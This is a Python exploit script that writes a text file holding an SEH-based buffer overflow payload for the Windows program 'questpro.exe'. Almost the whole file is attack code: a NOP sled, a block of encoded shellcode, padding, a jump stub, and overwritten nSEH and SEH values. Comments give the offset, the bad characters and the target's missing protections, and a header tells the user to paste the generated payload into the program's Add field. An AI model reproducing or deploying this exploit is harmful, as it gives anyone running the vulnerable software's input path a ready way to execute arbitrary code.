#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # red   error   bullet

File     = 'crash.txt'

try:
    # SEH triggered by exception 'Access violation when reading [41414141]'
    # EIP: 00403AB8    8B10       mov edx, dword ptr ds:[eax]
    # Bad Charaters - These bytes truncate the buffer on stack:
    #    badchrs  = '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d'
    # offset is here in paylaod structure (4116 byte offset for nSEH)
    nops     = '\x90'*400
    shellcode =  b""
    shellcode += b"\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0"
    shellcode += b"\x5e\x81\x76\x0e\xb5\xaa\xa2\x93\x83\xee\xfc"
    shellcode += b"\xe2\xf4\x49\x42\x20\x93\xb5\xaa\xc2\x1a\x50"
    shellcode += b"\x9b\x62\xf7\x3e\xfa\x92\x18\xe7\xa6\x29\xc1"
    shellcode += b"\xa1\x21\xd0\xbb\xba\x1d\xe8\xb5\x84\x55\x0e"
    shellcode += b"\xaf\xd4\xd6\xa0\xbf\x95\x6b\x6d\x9e\xb4\x6d"
    shellcode += b"\x40\x61\xe7\xfd\x29\xc1\xa5\x21\xe8\xaf\x3e"
    shellcode += b"\xe6\xb3\xeb\x56\xe2\xa3\x42\xe4\x21\xfb\xb3"
    shellcode += b"\xb4\x79\x29\xda\xad\x49\x98\xda\x3e\x9e\x29"
    shellcode += b"\x92\x63\x9b\x5d\x3f\x74\x65\xaf\x92\x72\x92"
    shellcode += b"\x42\xe6\x43\xa9\xdf\x6b\x8e\xd7\x86\xe6\x51"
    shellcode += b"\xf2\x29\xcb\x91\xab\x71\xf5\x3e\xa6\xe9\x18"
    shellcode += b"\xed\xb6\xa3\x40\x3e\xae\x29\x92\x65\x23\xe6"
    shellcode += b"\xb7\x91\xf1\xf9\xf2\xec\xf0\xf3\x6c\x55\xf5"
    shellcode += b"\xfd\xc9\x3e\xb8\x49\x1e\xe8\xc2\x91\xa1\xb5"
    shellcode += b"\xaa\xca\xe4\xc6\x98\xfd\xc7\xdd\xe6\xd5\xb5"
    shellcode += b"\xb2\x55\x77\x2b\x25\xab\xa2\x93\x9c\x6e\xf6"
    shellcode += b"\xc3\xdd\x83\x22\xf8\xb5\x55\x77\xf9\xbd\xf3"
    shellcode += b"\xf2\x71\x48\xea\xf2\xd3\xe5\xc2\x48\x9c\x6a"
    shellcode += b"\x4a\x5d\x46\x22\xc2\xa0\x93\x92\xa5\x2b\x75"
    shellcode += b"\xdf\xba\xf4\xc4\xdd\x68\x79\xa4\xd2\x55\x77"
    shellcode += b"\xc4\xdd\x1d\x4b\xab\x4a\x55\x77\xc4\xdd\xde"
    shellcode += b"\x4e\xa8\x54\x55\x77\xc4\x22\xc2\xd7\xfd\xf8"
    shellcode += b"\xcb\x5d\x46\xdd\xc9\xcf\xf7\xb5\x23\x41\xc4"
    shellcode += b"\xe2\xfd\x93\x65\xdf\xb8\xfb\xc5\x57\x57\xc4"
    shellcode += b"\x54\xf1\x8e\x9e\x92\xb4\x27\xe6\xb7\xa5\x6c"
    shellcode += b"\xa2\xd7\xe1\xfa\xf4\xc5\xe3\xec\xf4\xdd\xe3"
    shellcode += b"\xfc\xf1\xc5\xdd\xd3\x6e\xac\x33\x55\x77\x1a"
    shellcode += b"\x55\xe4\xf4\xd5\x4a\x9a\xca\x9b\x32\xb7\xc2"
    shellcode += b"\x6c\x60\x11\x42\x8e\x9f\xa0\xca\x35\x20\x17"
    shellcode += b"\x3f\x6c\x60\x96\xa4\xef\xbf\x2a\x59\x73\xc0"
    shellcode += b"\xaf\x19\xd4\xa6\xd8\xcd\xf9\xb5\xf9\x5d\x46"
    offset   = '\x41' * (4116-len(nops+shellcode)-22)
    jmpStart = '\xe8\xff\xff\xff\xff\xc3\x59\x31\xd2\x66\x81\xca\x03\x10\x66\x29\xd1\xff\xe1\xe8\xe8\xff'
    nSEH     = '\xeb\xe8\x90\x90' # jmp short -22 (to jmpStart)
    # 0x00400000 [questpro.exe] Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe] : pop ecx # pop ebp # ret  | {PAGE_EXECUTE_READ} 
    SEH      = '\x6b\x66\x42'
    payload  = nops+shellcode+offset+jmpStart+nSEH+SEH
    f        = open(File, 'w')                       # open file for write
    f.write(payload)
    f.close()                                        # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'

